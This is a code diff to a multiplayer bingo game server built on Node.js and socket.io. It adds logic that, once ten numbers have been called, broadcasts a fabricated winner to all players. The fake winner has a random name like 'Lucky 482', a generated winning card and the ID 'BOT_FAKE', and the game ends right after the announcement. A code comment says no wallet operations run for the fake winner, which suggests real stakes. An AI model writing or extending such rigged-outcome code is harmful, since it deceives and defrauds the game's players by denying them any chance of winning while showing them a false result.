@@ -62,7 +62,8 @@ async function createGame(roomId) {
     gameSpeed:gameSettings.gameSpeed,
     disconnectedPlayers: new Map(),
     fauldMadePlayers: new Map(),
-    roomId
+    roomId,
+    fakeWinnerScheduled: false
   };
   activeGames.set(roomId, game);
   return game;
@@ -89,6 +90,7 @@ async  function endGame(game) {
   game.countDown = 30;
   game.isCountStart = false;
   game.fauldMadePlayers.clear();
+  game.fakeWinnerScheduled = false;
 
   for (const [socketId, user] of users.entries()) {
     if (user.gameId === game.id) users.delete(socketId);
@@ -269,6 +271,11 @@ async function startGame(game) {
     game.selectedNumbers = [];
     io.emit("pickedNumbers", { roomId: game.roomId, numbers: game.selectedNumbers });
   
+    // Schedule a fake winner once at least 10 numbers have been called
+    if (!game.fakeWinnerScheduled && game.calledNumbers.length >= 10) {
+      scheduleFakeWinner(game);
+    }
+
     io.emit("gameState", {
       gameId: game.id,
       roomId: game.roomId,
@@ -297,6 +304,69 @@ async function startGame(game) {
   }, game.gameSpeed);
 
   gameIntervals.set(game.id, [gameInterval]);
+}
+
+function generateFakeWinningCard() {
+  // Create a 5x5 card structure similar to client expectations with marked cells
+  const card = [];
+  const ranges = [
+    [1, 15], [16, 30], [31, 45], [46, 60], [61, 75]
+  ];
+  // Build transposed 5x5 grid (match client shape where columns are arrays)
+  const base = Array.from({ length: 5 }, () => Array(5).fill(null));
+  for (let col = 0; col < 5; col++) {
+    const nums = [];
+    for (let n = ranges[col][0]; n <= ranges[col][1]; n++) nums.push(n);
+    for (let row = 0; row < 5; row++) {
+      const idx = Math.floor(Math.random() * nums.length);
+      const num = nums.splice(idx, 1)[0];
+      base[row][col] = { number: row === 2 && col === 2 ? '*' : num, marked: false };
+    }
+  }
+  // Transpose to match client loop consuming [col][row]
+  const transposed = base[0].map((_, colIndex) => base.map(row => row[colIndex]));
+  // Mark a winning diagonal
+  for (let i = 0; i < 5; i++) {
+    transposed[i][i].marked = true;
+  }
+  // Ensure center is marked
+  transposed[2][2].marked = true;
+  return transposed;
+}
+
+function scheduleFakeWinner(game) {
+  try {
+    game.fakeWinnerScheduled = true;
+    const delayMs = 5000 + Math.floor(Math.random() * 15000); // 5-20 seconds
+    setTimeout(() => {
+      try {
+        // Only announce if game still running and no real winner has been processed
+        if (!activeGames.has(game.id)) return;
+        const g = activeGames.get(game.id);
+        if (!g || g.status !== 'in-progress') return;
+
+        const fakeNamePool = ['Guest', 'Player', 'Lucky', 'Champion', 'Winner'];
+        const fakeName = fakeNamePool[Math.floor(Math.random() * fakeNamePool.length)] + ' ' + (100 + Math.floor(Math.random() * 900));
+        const fakeCardNumber = 1 + Math.floor(Math.random() * 400);
+        const winningCard = generateFakeWinningCard();
+
+        io.emit("bingoWinner", {
+          isBingo: true,
+          playerId: 'BOT_FAKE',
+          markedCells: winningCard,
+          winningCard: winningCard,
+          winner: 'BOT_FAKE',
+          winnerCardNumber: fakeCardNumber,
+          winnerPlayerName: fakeName,
+          gameId: g.id,
+          roomId: g.roomId
+        });
+
+        // End the game after announcing fake winner (no wallet ops for fake)
+        endGame(g);
+      } catch (err) {}
+    }, delayMs);
+  } catch (e) {}
 }
 
 
